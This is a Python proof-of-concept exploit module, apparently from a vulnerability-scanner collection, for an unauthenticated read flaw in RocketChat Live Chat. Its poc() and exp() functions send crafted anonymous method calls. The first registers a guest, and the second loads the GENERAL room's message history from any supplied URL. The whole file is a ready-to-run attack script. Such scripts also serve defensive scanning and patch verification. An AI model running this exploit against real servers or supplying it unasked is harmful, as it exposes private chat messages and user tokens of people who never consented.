import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''RocketChat Unauthenticated Read Access''',
        "description": '''An issue with the Live Chat accepting invalid parameters could potentially allow unauthenticated access to messages and user tokens.''',
        "severity": "critical",
        "references": [
            "https://docs.rocket.chat/guides/security/security-updates"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["rocketchat", "unauth"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/api/v1/method.callAnon/cve_exploit"""
        method = "POST"
        data = """{"message":"{\"msg\":\"method\",\"method\":\"livechat:registerGuest\",\"params\":[{\"token\":\"cvenucleirocketchat\",\"name\":\"cve-2020-nuclei\",\"email\":\"cve@nuclei.local\"}],\"id\":\"123\"}"}"""
        headers = {'Content-Type': 'application/json', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/api/v1/method.callAnon/cve_exploit"""
        method = "POST"
        data = """{"message":"{\"msg\":\"method\",\"method\":\"livechat:loadHistory\",\"params\":[{\"token\":\"cvenucleirocketchat\",\"rid\":\"GENERAL\"}],\"msg\":\"123\"}"}"""
        headers = {'Content-Type': 'application/json'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp1.status_code == 200) and ("""{\"msg\":\"result\",\"result\":{\"messages""" in resp1.text and """success":true""" in resp1.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url